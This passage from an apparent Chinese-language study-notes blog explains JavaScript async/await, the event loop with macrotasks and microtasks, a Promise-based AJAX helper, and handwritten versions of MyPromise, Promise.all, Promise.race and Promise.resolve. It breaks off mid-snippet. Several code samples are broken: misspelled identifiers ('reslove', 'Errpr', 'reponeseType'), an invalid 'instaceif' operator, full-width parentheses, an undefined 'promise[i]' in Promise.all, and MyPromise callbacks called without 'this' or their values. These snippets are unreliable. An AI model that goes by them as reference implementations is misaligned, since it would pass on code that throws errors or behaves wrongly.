class="headerlink" title="async和await"></a>async和await</h2><p>ES2017提供了<code>async</code>函数，使得异步操作变得更加方便。<code>async</code>函数就是<code>Generator</code>函数的语法糖。<br> <code>async</code>函数就是将<code>Generator</code>函数的星号（<code>*</code>）替换成<code>async</code>，将<code>yield</code>替换成<code>await</code>，仅此而已。<br> 进一步说，<code>async</code>函数完全可以看作多个异步操作，包装成的一个<code>Promise</code>对象，而<code>await</code>命令就是内部<code>then</code>命令的语法糖。 </p><ul><li>async函数返回的就是一个Promise对象，所接收的值就是函数return的值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello world'</span></span><br><span class="line">&#125;</span><br><span class="line">f().then(<span class="function">(<span class="params">v</span>)=&gt;</span><span class="built_in">console</span>.log(v))</span><br></pre></td></tr></table></figure><ul><li>在async函数内部可以使用await命令，表示等待一个异步函数的返回。</li><li>每遇到await关键字时，Promise都会停下，一直到运行结束。</li><li>await后面跟着的是一个Promise对象，如果不是的话会调用Promise.resolve方法将其转为一个resolve的Promise对象</li><li>Promise.resolve(x)相当于new Promise(resolve=&gt;resolve(x))的简写</li><li>async/await相比于Generator内置了执行器，可以自动执行，并且async返回的是Promise</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//首先定义一个方法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetchUser</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">reslove,reject</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="comment">//... reslove()</span></span><br><span class="line">        <span class="comment">//... reject()</span></span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="宏任务，微任务，事件循环"><a href="#宏任务，微任务，事件循环" class="headerlink" title="宏任务，微任务，事件循环"></a>宏任务，微任务，事件循环</h2><ul><li>JS 任务分为同步任务和异步任务；</li><li>同步任务都在主线程上执行，形成一个执行栈；</li><li>主线程之外，事件触发线程管理着一个任务队列，只要异步任务有了结果，就在任务队列里面放置一个事件</li><li>一旦执行栈中所有同步任务执行完毕（JS 引擎空闲之后），就会去读取任务队列，将可运行的异步任务添加到可执行栈里面，开始执行。</li></ul><blockquote><p>任务有同步任务、异步任务，ES5中这么分足够了</p><p>由于ES6有promise，就任务又分为<strong>宏任务（macro-task）</strong>和<strong>微任务（micro-task）</strong> </p></blockquote><p> <strong>宏任务(macrotask)：</strong>：</p><p>script(整体代码)、setTimeout、setInterval、UI 渲染、 I/O、postMessage、 MessageChannel、setImmediate(Node.js 环境)</p><p><strong>微任务(microtask)：</strong></p><p>Promise、 MutaionObserver、process.nextTick(Node.js环境</p><p> <strong>事件循环(Event Loop)</strong>:   指主线程重复从任务队列中取任务、执行的过程 </p><ul><li>选择最先进入队列的宏任务(通常是<code>script</code>整体代码)，如果有则执行</li><li>检查是否存在 Microtask，如果存在则不停的执行，直至清空 microtask 队列</li><li>更新render(每一次事件循环，浏览器都可能会去更新渲染)</li><li>重复以上步骤</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">'script start'</span>);</span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'setTimeout'</span>);</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">Promise</span>.resolve().then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'promise1'</span>);</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'promise2'</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script end'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//script start</span></span><br><span class="line"><span class="comment">//script end</span></span><br><span class="line"><span class="comment">//promise1</span></span><br><span class="line"><span class="comment">//promise2</span></span><br><span class="line"><span class="comment">//setTimeout</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'async1 start'</span>)  <span class="comment">//2</span></span><br><span class="line">    <span class="keyword">await</span> async2()               </span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'async1 end'</span>)    <span class="comment">//6 放入了微队列  </span></span><br><span class="line">&#125;                                <span class="comment">//    相当于async2.then(()=&gt;&#123;console.log('async1 end')&#125;)</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">async2</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'async2'</span>)       <span class="comment">//3</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script start'</span>)     <span class="comment">//1</span></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'setTimeout'</span>)   <span class="comment">//8</span></span><br><span class="line">&#125;,<span class="number">0</span>)</span><br><span class="line">async1()</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span>(<span class="params">resolve</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise1'</span>)     <span class="comment">//4</span></span><br><span class="line">    resolve()</span><br><span class="line">&#125;).then(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'promise2'</span>)    <span class="comment">//7   放入了微队列</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'script end'</span>)     <span class="comment">//5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//await是一个让出线程的标志。await后面的表达式会先执行一遍，将await 后面的代码加入到microtask中，然后就会跳出整个async函数来执行后面的代码</span></span><br><span class="line">script start</span><br><span class="line">async1 start</span><br><span class="line">async2</span><br><span class="line">promise1</span><br><span class="line">script end</span><br><span class="line">async1 end</span><br><span class="line">promise2</span><br><span class="line">setTimeout</span><br></pre></td></tr></table></figure><blockquote><p>1.首先，事件循环从宏任务(macrotask)队列开始，这个时候，宏任务队列中，只有一个script(整体代码)任务；当遇到任务源(task source)时，则会先分发任务到对应的任务队列中去。</p></blockquote><blockquote><p>2.然后我们看到首先定义了两个async函数，接着往下看，然后遇到了 console 语句，直接输出 script start。输出之后，script 任务继续往下执行，遇到 setTimeout，其作为一个宏任务源，则会先将其任务分发到对应的队列中</p></blockquote><blockquote><p>3.script 任务继续往下执行，执行了async1()函数，前面讲过async函数中在await之前的代码是立即执行的，所以会立即输出async1 start。<br> 遇到了await时，会将await后面的表达式执行一遍，所以就紧接着输出async2，然后将await后面的代码也就是console.log(‘async1 end’)加入到microtask中的Promise队列中，接着跳出async1函数来执行后面的代码</p></blockquote><blockquote><p>4.script任务继续往下执行，遇到Promise实例。由于Promise中的函数是立即执行的，而后续的 .then 则会被分发到 microtask 的 Promise 队列中去。所以会先输出 promise1，然后执行 resolve，将 promise2 分配到对应队列</p></blockquote><blockquote><p>5.script任务继续往下执行，最后只有一句输出了 script end，至此，全局任务就执行完毕了。<br> 根据上述，每次执行完一个宏任务之后，会去检查是否存在 Microtasks；如果有，则执行 Microtasks 直至清空 Microtask Queue。<br> 因而在script任务执行完毕之后，开始查找清空微任务队列。此时，微任务中， Promise 队列有的两个任务async1 end和promise2，因此按先后顺序输出 async1 end，promise2。当所有的 Microtasks 执行完毕之后，表示第一轮的循环就结束了</p></blockquote><blockquote><p>6.第二轮循环依旧从宏任务队列开始。此时宏任务中只有一个 setTimeout，取出直接输出即可，至此整个流程结束</p></blockquote><p>面试官问：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">setTimeout（()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"1"</span>)</span><br><span class="line">&#125;, <span class="number">0</span>）;</span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Promise</span>（resolve =&gt; &#123;</span><br><span class="line">    resolve()</span><br><span class="line">&#125;）.then(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"2"</span>)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"3"</span>)</span><br><span class="line"><span class="comment">//为什么你说先运行宏任务，不直接运行setTimeout呢？</span></span><br><span class="line"><span class="comment">//因为后面如果有console.log("3")时，肯定会先执行3，setTimeout是放到宏任务队列里的。</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve(<span class="number">1</span>).then(<span class="number">2</span>).then(<span class="built_in">Promise</span>.resolve(<span class="number">3</span>)).then(<span class="built_in">console</span>.log) <span class="comment">// 1</span></span><br><span class="line"><span class="comment">// then里面只要不是函数就不会传递，2是值，Promise.resolve(3)是Promise对象</span></span><br><span class="line"><span class="comment">// console.log 是函数</span></span><br></pre></td></tr></table></figure><h2 id="Promise-方式的-AJAX"><a href="#Promise-方式的-AJAX" class="headerlink" title="Promise 方式的 AJAX"></a>Promise 方式的 AJAX</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ajax</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">reslove, reject</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest()</span><br><span class="line">        xhr.open(<span class="string">'GET'</span>, url) </span><br><span class="line">        xhr.reponeseType = <span class="string">'json'</span></span><br><span class="line">        xhr.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">this</span>.status === <span class="number">200</span>) &#123;</span><br><span class="line">                reslove(<span class="keyword">this</span>.response)</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                reject(<span class="keyword">new</span> Errpr(<span class="keyword">this</span>.statusText))</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        xhr.send()</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ajax(<span class="string">'/api/'</span>)</span><br><span class="line">.then(<span class="function"><span class="params">res</span> =&gt;</span> <span class="built_in">console</span>.log(res))</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.log(err))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//promise.reslove</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">'foo'</span>)</span><br><span class="line">    .then(<span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="Promise静态方法"><a href="#Promise静态方法" class="headerlink" title="Promise静态方法"></a>Promise静态方法</h2><ul><li>Promise.reslove</li><li>Promise.reject</li></ul><p><strong>这两种方法均会创建Promise对象</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve(<span class="string">'foo'</span>)</span><br><span class="line">.then( <span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(value) )</span><br><span class="line"><span class="comment">// foo</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Promise</span>.reject(<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'rejected'</span>))</span><br><span class="line">.catch(<span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.log(err))</span><br><span class="line"><span class="comment">// Error: rejected</span></span><br><span class="line"><span class="comment">//    at &lt;anonymous&gt;:1:16</span></span><br></pre></td></tr></table></figure><h2 id="Promise并行执行"><a href="#Promise并行执行" class="headerlink" title="Promise并行执行"></a>Promise并行执行</h2><p>如果有多个请求接口的操作，如何判断全部执行完毕？<code>Promise.all</code></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 多个Promise对象组合成一个Promise对象</span></span><br><span class="line"><span class="keyword">let</span> promise = <span class="built_in">Promise</span>.all([ <span class="comment">//参数为数组</span></span><br><span class="line">    <span class="comment">// 请求1 必须为promise对象</span></span><br><span class="line">    <span class="comment">// 请求2</span></span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">promise.then(<span class="function"><span class="params">values</span> =&gt;</span> <span class="built_in">console</span>.log(values)) <span class="comment">// 输出数组，保存每一个请求的结果</span></span><br><span class="line">   .catch(<span class="function"><span class="params">err</span> =&gt;</span> <span class="built_in">console</span>.log(err))</span><br></pre></td></tr></table></figure><h2 id="手写Promise基础版"><a href="#手写Promise基础版" class="headerlink" title="手写Promise基础版"></a>手写Promise基础版</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PENDING = <span class="string">'pending'</span> <span class="comment">// 等待</span></span><br><span class="line"><span class="keyword">const</span> FULFILLED = <span class="string">'fulfilled'</span> <span class="comment">// 成功</span></span><br><span class="line"><span class="keyword">const</span> REJECTED = <span class="string">'rejected'</span> <span class="comment">//失败</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyPromise</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (executor) &#123;</span><br><span class="line">    executor(<span class="keyword">this</span>.resolve, <span class="keyword">this</span>.reject)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// promise 状态</span></span><br><span class="line">  status = PENDING</span><br><span class="line">  <span class="comment">// 成功之后的值</span></span><br><span class="line">  value = <span class="literal">undefined</span></span><br><span class="line">  <span class="comment">// 失败后的原因</span></span><br><span class="line">  reason = <span class="literal">undefined</span></span><br><span class="line">  <span class="comment">// 成功回调</span></span><br><span class="line">  successCallback = <span class="literal">undefined</span></span><br><span class="line">  <span class="comment">// 失败回调</span></span><br><span class="line">  failCallback = <span class="literal">undefined</span></span><br><span class="line">  resolve = <span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 如果状态不是等待 阻止程序向下执行</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.status !== PENDING) <span class="keyword">return</span></span><br><span class="line">    <span class="comment">// 将状态更改为成功</span></span><br><span class="line">    <span class="keyword">this</span>.status = FULFILLED</span><br><span class="line">    <span class="comment">// 保存成功之后的值</span></span><br><span class="line">    <span class="keyword">this</span>.value = value</span><br><span class="line">    <span class="comment">// 判断成功回调是否存在 存在则调用</span></span><br><span class="line">    <span class="keyword">this</span>.successCallback &amp;&amp; successCallback(<span class="keyword">this</span>.value)</span><br><span class="line">  &#125;</span><br><span class="line">  reject = <span class="function"><span class="params">reason</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// 如果状态不是等待 阻止程序向下执行</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.status !== PENDING) <span class="keyword">return</span></span><br><span class="line">    <span class="comment">// 将状态更改为失败</span></span><br><span class="line">    <span class="keyword">this</span>.status = REJECTED</span><br><span class="line">    <span class="comment">// 保存失败后的原因</span></span><br><span class="line">    <span class="keyword">this</span>.reason = reason</span><br><span class="line">    <span class="comment">// 判断失败回调是否存在 存在则调用</span></span><br><span class="line">    <span class="keyword">this</span>.failCallback &amp;&amp; failCallback(<span class="keyword">this</span>.reason)</span><br><span class="line">  &#125;</span><br><span class="line">  then (successCallback, failCallback) &#123;</span><br><span class="line">    <span class="comment">// 判断状态</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.status === FULFILLED) &#123;</span><br><span class="line">      successCallback()</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">this</span>.status === REJECTED) &#123;</span><br><span class="line">      failCallback()</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 等待</span></span><br><span class="line">        <span class="comment">// 将成功回调和失败回调存储起来</span></span><br><span class="line">        <span class="keyword">this</span>.successCallback = successCallback</span><br><span class="line">        <span class="keyword">this</span>.failCallback = failCallback</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试 </span></span><br><span class="line"><span class="keyword">let</span> promise = <span class="keyword">new</span> MyPromise(<span class="function">(<span class="params">resolve, reject</span>) =&gt;</span> &#123;</span><br><span class="line">    setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        resolve(<span class="string">'成功'</span>)</span><br><span class="line">    &#125;, <span class="number">2000</span>)</span><br><span class="line">    resolve(<span class="string">'成功'</span>)</span><br><span class="line">    <span class="comment">// reject('失败')</span></span><br><span class="line">&#125;)</span><br><span class="line">promise.then(<span class="function"><span class="params">value</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(value)</span><br><span class="line">&#125;, reason =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(reason)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h2 id="promise-all"><a href="#promise-all" class="headerlink" title="promise.all"></a>promise.all</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.all = <span class="function"><span class="keyword">function</span>(<span class="params">promises</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">              <span class="keyword">let</span> result = []</span><br><span class="line">              <span class="keyword">let</span> len = promises.length</span><br><span class="line">              <span class="keyword">let</span> index = <span class="number">0</span></span><br><span class="line">              <span class="keyword">if</span>(len==<span class="number">0</span>)&#123;</span><br><span class="line">                  resolve(result)</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">                  <span class="built_in">Promise</span>.resolve(promise[i]).then(<span class="function">(<span class="params">res</span>)=&gt;</span>&#123;</span><br><span class="line">                      result[i] = res</span><br><span class="line">                      index++</span><br><span class="line">                      <span class="keyword">if</span>(index==len)&#123;</span><br><span class="line">                          resolve(result)</span><br><span class="line">                          <span class="keyword">return</span></span><br><span class="line">                      &#125;</span><br><span class="line">                  &#125;).catch(<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;</span><br><span class="line">                      reject(err)</span><br><span class="line">                  &#125;)</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2 id="promise-race"><a href="#promise-race" class="headerlink" title="promise.race"></a>promise.race</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.race = <span class="function"><span class="keyword">function</span>(<span class="params">promises</span>)</span>&#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>)=&gt;</span>&#123;</span><br><span class="line">              <span class="keyword">let</span> len = promises.length</span><br><span class="line">              <span class="keyword">if</span>(len==<span class="number">0</span>) <span class="keyword">return</span></span><br><span class="line">              <span class="keyword">for</span>(<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line">                  <span class="built_in">Promise</span>.resolve(promises[i]).then(<span class="function"><span class="params">res</span>=&gt;</span>&#123;</span><br><span class="line">                      resolve(res)</span><br><span class="line">                      <span class="keyword">return</span></span><br><span class="line">                  &#125;).catch(<span class="function">(<span class="params">err</span>)=&gt;</span>&#123;</span><br><span class="line">                      reject(err)</span><br><span class="line">                      <span class="keyword">return</span> </span><br><span class="line">                  &#125;)</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;)</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2 id="promise-resolve"><a href="#promise-resolve" class="headerlink" title="promise.resolve"></a>promise.resolve</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Promise</span>.resolve = <span class="function"><span class="keyword">function</span> (<span class="params">value</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (value instaceif promise) <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> resolve(value))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 例子</span></span><br><span class="line"><span class="built_in">Promise</span>.resolve(<span class="number">100</span>).then(<span class="function"><span class="params">value</span> =&gt;</span> <span class="built_in">console</span>.log(value))</span><br></pre></td></tr></table></figure><h2 id="一道习题"><a href="#一道习题" class="headerlink" title="一道习题"></a>一道习题</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原代码</span></span><br><span class="line">setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> a = <span class="string">'hello '</span></span><br><span class="line">  setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="string">'lagou '</span></span><br><span class="line">    setTimeout(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> c = <span class="string">'I love you'</span></span><br><span class="line">      <span class="built_in">console</span>.log(a + b + c)</span><br><span class="line">    &#125;, <span class="number">1000</span>)</span><br><span class="line">  &#125;, <span class="number">1000</span>)</span><br><span class="line">&#125;, <span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 改进：高阶函数 + promise链式调用</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span> (<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params">param</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">resolve,reject</span>) =&gt;</span> &#123;</span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> resolve(param += str), <span class="number">1000</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p1 = f(<span class="string">'hello '</span>)</span><br><span class="line"><span class="keyword">var</span> p2 = f(<span class="string">'lagou '</span>)</span><br><span class="line"><span class="keyword">var</span> p3 = f(<span class="string">'I love you'</span>)</span><br><span class="line"></span><br><span class="line">p1(<span class="string">''</span>).then(<span class="function">(<span class="params">res</span>) =&gt;</span> p2(res)).then(<span class="function">(<span class="params">res</span>) =&gt;</span> p3(res)).then(<span class="function">(<span class="params">res</span>) =&gt;</span> <span class="built_in">console</span>.log(res))</span><br><span class="line">p1(<span class="string">''</span>).then(p2).then(p3).then(<span 